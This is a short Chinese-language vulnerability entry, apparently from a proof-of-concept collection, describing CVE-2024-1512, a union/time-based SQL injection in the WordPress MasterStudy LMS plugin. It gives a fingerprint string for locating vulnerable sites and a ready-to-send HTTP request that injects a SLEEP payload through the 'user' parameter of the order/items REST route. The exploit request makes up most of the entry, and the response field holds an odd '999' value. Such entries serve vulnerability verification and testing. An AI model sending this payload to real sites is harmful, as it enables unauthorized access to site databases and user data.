﻿# WordPress MasterStudy LMS插件 SQL注入

> 更新时间：2024-05-07

> 漏洞编号：CVE-2024-1512

> 漏洞说明：WordPress Plugin MasterStudy LMS WordPress Plugin 3.2.5 版本及之前版本存在安全漏洞，该漏洞源于对用户提供的参数转义不足，导致可以通过/lms/stm-lms/order/items REST路由的 user参数进行基于联合的SQL注入

> 漏洞特征：body="wp-content/plugins/masterstudy-lms-learning-management-system/"

> 验证脚本：HTTP

```
GET /?rest_route=/lms/stm-lms/order/items&author_id=1&user=1)+AND+%28SELECT+3493+FROM+%28SELECT%28SLEEP%285%29%29%29sauT%29+AND+%283071%3D3071 HTTP/1.1
Accept-Charset: utf-8
Accept-Encoding: gzip, deflate
Connection: close
```

> 响应代码特征：999

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：WordPress MasterStudy LMS插件 SQL注入.poc

